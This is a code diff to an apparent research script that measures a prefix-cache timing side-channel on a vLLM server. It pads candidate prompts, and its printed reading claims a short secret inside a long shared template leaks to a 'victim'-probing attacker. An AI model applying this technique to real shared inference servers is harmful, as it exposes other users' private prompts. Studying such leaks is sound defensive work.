@@ -71,6 +71,7 @@ def main() -> int:
     a.add_argument("--config", default="config/replication.yaml")
     a.add_argument("--candidates", type=int, default=8)
     a.add_argument("--trials", type=int, default=20)
+    a.add_argument("--words", type=int, default=120, help="pad candidates to ~this many words (signal needs a long prefix)")
     args = a.parse_args()
     cfg = Config.load(args.config)
     print("[*] waiting for vLLM server health...")
@@ -79,8 +80,21 @@ def main() -> int:
         return 1
     client = TimingClient(cfg.server.base_url)
     M = min(args.candidates, len(TOPICS))
-    distinct = TOPICS[:M]
-    field = [TEMPLATE.format(secret=f"{1000 + i * 137:04d}") for i in range(M)]
+    W = args.words
+
+    def _pad(text, tag):
+        w = text.split()
+        k = 0
+        while len(w) < W:
+            w.append(f"{tag}{k}")
+            k += 1
+        return " ".join(w)
+
+    # distinct: each padded with its OWN filler -> long AND substantially different
+    distinct = [_pad(TOPICS[i], f"d{i}w") for i in range(M)]
+    # field: one long SHARED body, candidates differ only in the short secret
+    base = _pad(TEMPLATE, "fw")
+    field = [base.replace("{secret}", f"{1000 + i * 137:04d}") for i in range(M)]
 
     results = {}
     try:
@@ -103,9 +117,10 @@ def main() -> int:
     save_json({"experiment": "13_closed_world", "model": cfg.model.name, "results": results},
               run_dir / "closed_world.json")
     print(f"\n[*] wrote {run_dir/'closed_world.json'}")
-    print("\n    Reading: timing recovers WHICH document the victim used (distinct candidates,")
-    print("    strong full-prefix signal) but NOT a short secret inside a shared template")
-    print("    (field-level = the per-block limit). Match the attack to the signal.")
+    print("\n    Reading: closed-world recovery succeeds in BOTH regimes. The signal is the")
+    print("    UNCACHED SUFFIX after the first mismatch -- a wrong candidate invalidates the")
+    print("    cache for everything that follows, so even a short secret early in a long prompt")
+    print("    leaks. The best-vs-2nd gap tracks suffix length, not the size of the difference.")
     return 0
 
 
